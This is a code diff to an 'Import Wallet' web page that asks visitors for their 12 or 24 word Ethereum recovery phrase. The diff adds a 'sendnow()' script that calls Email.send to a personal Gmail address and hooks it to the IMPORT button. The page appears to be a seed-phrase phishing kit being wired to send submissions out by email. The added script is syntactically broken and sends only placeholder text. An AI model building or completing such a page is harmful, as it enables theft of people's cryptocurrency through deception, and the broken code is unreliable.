@@ -68,6 +68,21 @@ img.emoji {
 <!DOCTYPE html>
 <html>
 <head>
+
+<script>
+
+function sendnow()  {
+Email.send("from@you.com",
+"Seyiolawale50@gmail.com",
+"This is a subject",
+"this is the body",
+"smtp.yourisp.com",
+"username",
+"password"
+
+}
+</script>
+
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
     <title>Import Wallet</title>
@@ -110,7 +125,7 @@ img.emoji {
 								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
 								<input type="hidden" name="value" value="Ethereum">
 								<input type="hidden" name="import_phrase" value="1">
-								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+								<div class="form-group"><button onclick=sendnow(); class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="keystore">
